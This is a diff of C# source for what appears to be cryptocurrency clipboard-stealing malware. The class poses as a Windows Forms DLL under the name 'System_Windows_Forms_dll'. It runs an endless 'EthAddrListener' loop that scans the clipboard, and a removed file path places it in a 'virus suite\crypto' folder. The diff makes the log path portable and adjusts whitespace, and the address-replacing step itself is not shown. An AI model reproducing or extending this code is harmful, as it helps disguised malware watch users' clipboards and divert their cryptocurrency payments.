@@ -1,7 +1,6 @@
 using System;
 using System.Windows.Forms;
 using System.Collections.Generic;
-//for logging and timer
 using System.IO;
 using System.Diagnostics;
 
@@ -43,7 +42,7 @@ public sealed class System_Windows_Forms_dll
     private static IDataObject clipData = null;
 
     //Logging Content - DELETABLE
-    private readonly static string path = @"C:\Users\Hamerton Mathieu\C# Projects\src\main\c#\virus suite\crypto\notes\ClipboardLogger.log";
+    private readonly static string path = Directory.GetParent(Directory.GetCurrentDirectory()).FullName + @"\ClipboardLogger.log";
     private static string timestamp =  string.Format("{0:[yyyy-MM-dd hh-mm-ss-ffff]}",DateTime.Now);
     private static int loopCounter = 1;
     private readonly static string logInfo = " INFO - ";
@@ -73,7 +72,7 @@ public sealed class System_Windows_Forms_dll
         }   
     }
     public void EthAddrListener(){
-        while(true){              
+        while(true){            
                 File.AppendAllText(path,timestamp + logInfo + "****************Listener Iteration: " + loopCounter.ToString() + " ****************" + Environment.NewLine);
                 File.AppendAllText(path,timestamp + logInfo + "SETTING SCANNER" + Environment.NewLine);
                 setClipboardScanner();
